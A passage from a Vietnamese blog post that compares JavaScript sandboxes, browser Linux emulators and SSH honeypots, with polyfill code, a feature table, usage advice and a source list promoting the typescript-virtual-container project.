    memCache.set(cursor.key, cursor.value);
    cursor.continue();
  };
});
```

Đây là lý do snapshot VFS sống sót qua tải lại trang trong trình duyệt -- toàn bộ nhị phân `.vfsb` được ghi vào IndexedDB qua polyfill này, và đọc lại ở lần tải sau. Không Wasm, không máy chủ. Chỉ IndexedDB, có trong mọi trình duyệt từ 2011.

**`node:crypto` -- SHA-256 bằng JS thuần**

Thay vì nhập thư viện crypto Wasm, polyfill crypto triển khai SHA-256 từ con số không dùng hằng số vòng FIPS 180-4. 166 dòng JS thuần với hỗ trợ đầy đủ đầu ra hex/base64/Uint8Array. Mọi băm trong thư viện đi qua đây -- vân tay khóa chủ SSH, checksum nội bộ, tất cả. Gọn, không phụ thuộc, chạy được.

**`node:os` -- đọc phần cứng thật của trình duyệt**

Đây là điểm tinh tế đẹp. Thay vì trả giá trị hư cấu ghi cứng, `node:os` đọc `navigator.deviceMemory` cho tổng RAM và `navigator.hardwareConcurrency` cho số CPU. Nên `neofetch` trong build trình duyệt báo cáo thứ khớp máy thật của bạn -- không phải stub đểu `2 lõi, 2 Go RAM`.

```js
export function totalmem(){
  return navigator?.deviceMemory
    ? navigator.deviceMemory * 1024 * 1024 * 1024
    : 2 * 1024 * 1024 * 1024; // mặc định 2 Go
}
export function cpus(){
  const n = navigator?.hardwareConcurrency || 2;
  // cũng phân tích navigator.userAgent để đoán chuỗi mẫu CPU
  return Array.from({ length: n }, () => ({ model, speed: 2400 }));
}
```

**`node:net`, `ssh2`, `roxify` -- stub trung thực**

Trình duyệt không thể mở socket TCP hay chạy SSH thật, nên đây là các stub ném lỗi `NotImplemented` với thông điệp rõ nếu thứ gì đó cố dùng chúng. Lỗi vẫn rõ ràng, không `undefined` trả về nơi chờ object. Chỉ thông điệp to rõ "cái này không chạy trong trình duyệt" -- đúng thứ bạn muốn.

**`process.js` và `buffer.js` -- global bơm vào**

Hai cái này được bơm lên đầu mỗi tệp bundle qua tùy chọn `inject` của esbuild, nên `process` và `Buffer` có sẵn toàn cục mà không cần import rõ. `process.js` tí hon : `env`, `version`, `platform: 'browser'`, `nextTick` qua `queueMicrotask`, `uptime` qua `performance.now()`. `buffer.js` là tái triển khai đầy đủ `Buffer` trên `Uint8Array` -- mọi phương thức `readUInt32BE`, `writeInt16LE`, mã hóa hex/base64 mà triển khai SSH và VFS phụ thuộc.

---

Toàn bộ polyfill khoảng 640 dòng JS viết tay tổng cộng. Không gói npm, không Wasm. Và kết quả là bundle trình duyệt đúng là thư viện, chạy gốc, không còn lo lắng quen thuộc kiểu "nhưng liệu nó có thực sự chạy trong trình duyệt?" như với thư viện thiết kế cho Node trước. Đáng liếc thư mục `polyfills/` trong repo nếu bạn tò mò -- mỗi tệp gọn và tự đọc được, một lựa chọn phong cách tôi rất trân trọng.

| | `vm` | `isolated-vm` | `quickjs-emscripten` | `v86` | CheerpX | WebContainers | Cowrie | `typescript-virtual-container` |
|---|---|---|---|---|---|---|---|---|
| **Loại** | Sandbox JS | Sandbox JS | Sandbox JS | Trình giả lập | Trình giả lập | Node.js/Wasm | Honeypot | Trình mô phỏng |
| **Cách ly JS** | ⚠️ phạm vi | ✅ V8 Isolate | ✅ Wasm | n/a | n/a | một phần | n/a | ✅ Worker |
| **Nhân Linux thật** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | ❌ | ❌ |
| **Trình thông dịch shell** | ❌ | ❌ | ❌ | ✅ (thật) | ✅ (thật) | ✅ (thật) | một phần | ✅ (tùy chỉnh) |
| **~170 lệnh Unix** | ❌ | ❌ | ❌ | ✅ | ✅ | một phần | ~20 | ✅ |
| **Quyền POSIX** | ❌ | ❌ | ❌ | ✅ | ✅ | ✅ | một phần | ✅ áp dụng |
| **Quản lý người dùng** | ❌ | ❌ | ❌ | ✅ | ✅ | ❌ | tối thiểu | ✅ đầy đủ |
| **Máy chủ SSH thật** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **SFTP / SCP** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Honeypot/kiểm toán** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ | ✅ |
| **Diff/snapshot VFS** | ❌ | ❌ | ❌ | hạn chế | ❌ | ❌ | ❌ | ✅ |
| **Mạng ảo L2/L3** | ❌ | ❌ | ❌ | cơ bản | ❌ | ❌ | ❌ | ✅ đầy đủ |
| **VPN ảo** | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **Hỗ trợ trình duyệt** | ❌ | ❌ | ✅ | ✅ | ✅ | ✅ | ❌ | ✅ |
| **Node.js gốc** | ✅ | ✅ | ✅ | ✅ | ❌ | ❌ | ❌ | ✅ |
| **API có kiểu** | cơ bản | ✅ | ✅ | tối thiểu | ❌ | ✅ | ❌ | ✅ đầy đủ |
| **Tương thích nhị phân** | n/a | n/a | n/a | ✅ | ✅ | một phần | n/a | ❌ |
| **Thời gian khởi động** | tức thì | tức thì | tức thì | 15-40s | 15-40s | 2-5s | tức thì | <1s |
| **RAM/instance** | ~1 Mo | ~3-10 Mo | ~5-15 Mo | 150-256 Mo | 200+ Mo | ~100 Mo | ~50 Mo | ~5-20 Mo |
| **Phụ thuộc runtime** | 0 | 1 (gốc) | 1 (Wasm) | 0 | độc quyền | 1 | phụ thuộc Python | 3 (ssh2, ws, fflate) |
| **Trạng thái** | ổn định | ✅ hoạt động | ✅ hoạt động | ✅ rất hoạt động | thương mại | ✅ hoạt động | ✅ hoạt động | ✅ hoạt động |

---

## Khi nào dùng cái gì

**Bạn phải chạy JavaScript không đáng tin -- công thức người dùng gửi, plugin, hook script.**
→ `isolated-vm`. V8 Isolate thật, giới hạn bộ nhớ chặt, cầu giao tiếp rõ ràng. Tránh `vm2` -- danh sách CVE cứ dài thêm, nghiêm túc đấy kiểu vài tháng lại có cái mới. Tránh `vm` -- nó hoàn toàn không phải sandbox, làm ơn.

**Bạn phải cách ly JS mà không muốn extension gốc, hay cần tương thích trình duyệt.**
→ `quickjs-emscripten`. Ranh giới Wasm, module khoảng 500 Ko, chạy trong trình duyệt và Node. Chậm hơn V8 nhưng cách ly thật.

**Bạn phải khởi động OS Linux thật không sửa đổi với tương thích nhị phân.**
→ `v86` cho Linux 32-bit, hay `container2wasm` nếu bạn có ảnh Docker sẵn. Chấp nhận 150 Mo+ RAM và 30 giây khởi động, đó là thỏa thuận. Nếu cần 64-bit, nhìn CheerpX hay cứ dùng runtime container thật.

**Bạn phải nhúng terminal kiểu Linux vào ứng dụng web không backend.**
→ `v86` (OS đầy đủ, nặng, khởi động chậm) hay bundle trình duyệt của `typescript-virtual-container` (trình mô phỏng, nhẹ hơn, khởi động tức thì, gồm `startxfce4` cho desktop đầy đủ khá ngầu).

**Bạn cần hướng dẫn lập trình tương tác trực tuyến hay IDE trình duyệt.**
→ WebContainers nếu bạn tập trung hệ sinh thái Node.js. CheerpX nếu bạn cần userspace Linux thật. Bundle trình duyệt của `typescript-virtual-container` nếu bạn muốn lựa chọn nhẹ hơn với API có kiểu.

**Bạn muốn thu thập TTP kẻ tấn công SSH ở quy mô lớn.**
→ Cowrie là chuẩn production, chấm hết. Chạy trên bất kỳ máy chủ Linux nào, tích hợp mọi SIEM, giờ có chế độ LLM. Cứ dùng Cowrie.

**Bạn muốn dữ liệu honeypot SSH trong ứng dụng Node.js với API lập trình được.**
→ `typescript-virtual-container`. Lệnh thực sự chạy. VFS là cấu trúc dữ liệu thật bạn có thể chụp và lấy khác biệt tức thì. Kẻ tấn công có môi trường tương tác thuyết phục, và bạn có dữ liệu kiểm toán có cấu trúc mà không rời Node.

**Bạn cần tự động hóa shell / test trong CI không Docker.**
→ `typescript-virtual-container`. Khởi động dưới một giây, chụp trước test, khôi phục sau. Chạy lệnh shell với API có kiểu. Không daemon Docker, không nhân, không VM, không chờ.

**Bạn cần môi trường shell đa thuê bao (SaaS, giáo dục, đào tạo).**
→ `typescript-virtual-container`. 5-20 Mo mỗi instance so với 150-256 Mo cho trình giả lập. 100 người dùng đồng thời : ~2 Go so với ~25 Go. Chênh lệch lớn về chi phí host!

**Bạn cần honeypot thực tế mà còn xây được phòng lab mạng đa VM.**
→ `typescript-virtual-container` là thứ duy nhất ở khoảng này làm được cả hai.

---

## Điều nó không làm được (và tôi muốn trung thực về điều này)

Nó không thể chạy nhị phân x86 gốc. Nếu bạn cần biên dịch mã C, chạy trình thông dịch Python thật, hay dùng phần mềm biên dịch cho Linux, không có ABI nhân nào đỡ các syscall đó. Các lệnh như `gcc`, `python3`, và `node` là stub -- chúng trả lời `--version` và lời gọi phổ biến, nhưng không chạy gì thật.

Đó là thỏa hiệp nền tảng : bạn lãi ít bộ nhớ hơn 10 đến 50 lần, khởi động tức thì, tương thích trình duyệt, API có kiểu, SSH thật, và mạng ảo -- và bạn bỏ tương thích nhị phân với userspace Linux.

Fortune đã suy nghĩ nhiều về điều này khi thiết kế dự án. Với ca dùng cô ấy nhắm -- honeypot, test, terminal nhúng, môi trường CI -- chạy nhị phân biên dịch thực ra không bao giờ cần. Pipeline shell, thao tác tệp, định tuyến mạng và SSH phủ hết. Nhưng nếu ca dùng của bạn đòi phần mềm biên dịch thật, `v86` hay Docker là câu trả lời đúng, không phải cái này.

---

## Kết luận

Vậy đó. Hệ sinh thái này rộng và manh mún hơn vẻ ngoài. `vm` là bộ tách phạm vi, không phải sandbox. `vm2` tiếp tục tích CVE (thật đấy, xem khuyến cáo tháng này). `isolated-vm` là câu trả lời đúng cho cách ly JS nhưng chỉ JS. `quickjs-emscripten` là lựa chọn đúng khi bạn cần tương thích trình duyệt hay muốn tránh extension gốc. `v86` và CheerpX là trình giả lập thật khi bạn cần tương thích nhị phân thật. WebContainers là Node.js trong Wasm, không phải môi trường Linux tổng quát. Cowrie là chuẩn vàng honeypot SSH, nhưng là Python và không gốc Node.

Rồi còn `typescript-virtual-container` -- dự án của Fortune -- sống trong loại riêng của nó. Không trình giả lập, không sandbox JS, không honeypot thụ động. Thứ gì đó ở giữa hóa ra hữu ích bất ngờ cho nhiều việc không cái nào khác làm được.

`typescript-virtual-container` lấp khoảng trống không cái nào khác chạm : môi trường shell Linux đầy đủ lập trình được với SSH thật, SFTP, quyền POSIX, quản lý người dùng, mạng ảo, và API TypeScript có kiểu -- chạy trong khoảng 10 Mo, khởi động dưới một giây, chạy cả trong Node.js và trình duyệt.

Nếu bạn muốn thử : mã nguồn trên [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) và có demo trực tuyến (gồm `startxfce4` cho desktop đầy đủ, đúng là bệnh) trên [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). Ghé xem và thả vài sao cho Fortune trên GitHub, cô ấy xứng đáng!

Cảm ơn đã đọc -- bài này dài ngay cả với chuẩn của tôi :) hy vọng nó hữu ích cho bạn!

---

## Nguồn

Tôi đã cố gắn mỗi khẳng định tới nguồn gốc -- khuyến cáo CVE, tài liệu chính thức, repo GitHub, bài blog của maintainer. Vài lưu ý : danh sách CVE vm2 cứ dài thêm nên link FortiGuard có thể lỗi thời lúc bạn đọc (xem trang khuyến cáo GitHub để lấy mới nhất). Các link Bellard đều ổn định -- trang cá nhân của ông ấy tồn tại từ lâu và nội dung không đổi. Và nếu bạn muốn đào sâu polyfill nào, cứ duyệt thư mục `polyfills/` trong repo `typescript-virtual-container` trực tiếp -- nó dễ đọc hơn bất kỳ mô tả nào tôi viết ở đây.

### Sandbox JavaScript

- **Module `vm` của Node.js** -- tài liệu chính thức : [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Cảnh báo bảo mật `vm` của Node.js** -- "Module vm không phải cơ chế bảo mật. Đừng dùng nó để chạy mã không đáng tin" : [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`** -- npm : [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub : [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Dòng thời gian CVE vm2** -- Cảnh báo FortiGuard với danh sách CVE đầy đủ và ngày : [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017** -- Thoát bằng lỗi async, GHSA : [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314** -- Proxy + Error.name + thoát Function, gist PoC : [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466** -- Mục Exploit DB với PoC đầy đủ : [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026** -- 11 vụ thoát mới, phân tích : [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer : [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"** -- Post-mortem của oxeye.io về CVE-2022-36067 : [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`** -- npm : [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub : [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Nội bộ V8 Isolate** -- Hướng dẫn nhúng : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`** -- npm : [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub : [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`** -- npm : [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub : [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Động cơ QuickJS** -- của Fabrice Bellard : [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Mô hình quyền Deno** -- tài liệu : [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Ra mắt Deno 2** -- Tháng 10 năm 2024 : [deno.com/blog/v2](https://deno.com/blog/v2)
- **Đề xuất TC39 ShadowRealm** -- [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Đề xuất TC39 Compartments** -- [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"** -- Bài thực hành của Andrew Healey về cách sandbox Deno : [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Trình giả lập Linux

- **`v86`** -- npm : [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub : [github.com/copy/v86](https://github.com/copy/v86) · Demo : [copy.sh/v86](https://copy.sh/v86)
- **Ma trận hỗ trợ OS v86** -- [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS v86 dùng) -- [seabios.org](https://www.seabios.org/SeaBIOS)
- **Mở rộng Bochs VBE** (tham chiếu VGA) -- [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux** -- Trình giả lập của Bellard : [bellard.org/jslinux](https://bellard.org/jslinux/) · Ghi chú kỹ thuật (TinyEMU, lịch sử, asm.js→Wasm) : [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU** -- Mã C : [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Mirror GitHub không chính thức : [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k** -- Trình giả lập JS OpenRISC : [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo : [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX** -- tài liệu : [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Hướng dẫn pthreads : [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers** -- npm : [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Tài liệu API : [webcontainers.io](https://webcontainers.io) · Thông báo : [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Tổng quan InfoQ : [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm** -- GitHub : [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Bài blog NTT : [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Bài của Simon Willison : [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js** -- npm : [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub : [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · trang : [xtermjs.org](https://xtermjs.org)
- **node-pty** -- npm : [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft) : [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypot

- **Cowrie** -- GitHub : [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Tài liệu : [docs.cowrie.org](https://docs.cowrie.org) · Trang : [cowrie.org](https://www.cowrie.org/)
- **Kippo** -- GitHub (lưu trữ) : [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh** -- GitHub : [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame** -- GitHub : [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird** -- Docker Hub : [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot** -- Honeypot SSH Node.js tối thiểu : [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots** -- Danh sách có tổ chức : [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082** -- Khám phá thông tin hệ thống (cách kẻ tấn công nhận diện honeypot) : [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm** : [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub** : [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo trực tuyến** : [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Hướng dẫn kiến trúc** : [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (triển khai giao thức SSH) -- npm : [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub : [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (nén snapshot VFS) -- npm : [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (vận chuyển shell WebSocket) -- npm : [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Đọc thêm

- **Mô hình quyền POSIX** -- Đặc tả Open Group : [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (mẫu dùng trong bền vững VFS) -- [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Mô hình V8 Isolate** -- "Embedder's Guide" : [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Đặc tả ISA RISC-V** (cho bối cảnh TinyEMU/JSLinux) -- [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Kiến trúc OpenRISC 1000** -- [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"** -- Simon Willison TIL, đối chiếu hữu ích với cách Wasm : [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"** -- Simon Willison TIL về kích thước bundle quickjs-emscripten : [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
